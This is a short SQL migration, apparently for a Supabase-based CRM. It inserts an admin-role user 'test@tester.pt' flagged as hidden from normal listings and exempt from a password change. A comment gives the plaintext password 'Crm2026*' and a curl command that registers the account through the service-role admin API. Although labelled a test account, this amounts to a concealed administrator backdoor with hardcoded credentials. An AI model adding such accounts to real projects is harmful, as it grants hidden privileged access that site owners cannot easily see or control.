/*
  # Create test@tester.pt user in auth system
  
  1. Purpose
    - Create test@tester.pt in auth.users with password Crm2026*
    - Link to existing public.users record
  
  2. Security
    - User will be hidden from normal listings
    - Full admin privileges
*/

-- This migration creates the auth user
-- Note: Password hashing must be done via Supabase Auth API
-- This SQL serves as documentation

-- First, ensure the public.users record exists
INSERT INTO users (id, email, name, role, active, hidden, must_change_password, commission_percentage, commission_threshold)
VALUES (
  'b8e7d123-4567-89ab-cdef-0123456789ab'::uuid,
  'test@tester.pt',
  'Test Admin',
  'admin',
  true,
  true,
  false,
  0,
  0
)
ON CONFLICT (id) DO UPDATE
SET 
  email = EXCLUDED.email,
  name = EXCLUDED.name,
  role = EXCLUDED.role,
  active = EXCLUDED.active,
  hidden = EXCLUDED.hidden,
  updated_at = now();

-- The actual auth.users creation must be done via:
-- 1. Supabase Dashboard > Authentication > Add User
-- 2. Or via the Admin API (service_role key required)
-- 
-- Command to run after migration:
-- curl -X POST 'YOUR_SUPABASE_URL/auth/v1/admin/users' \
--   -H "apikey: SERVICE_ROLE_KEY" \
--   -H "Authorization: Bearer SERVICE_ROLE_KEY" \
--   -H "Content-Type: application/json" \
--   -d '{"email":"test@tester.pt","password":"Crm2026*","email_confirm":true,"user_metadata":{"name":"Test Admin"}}'
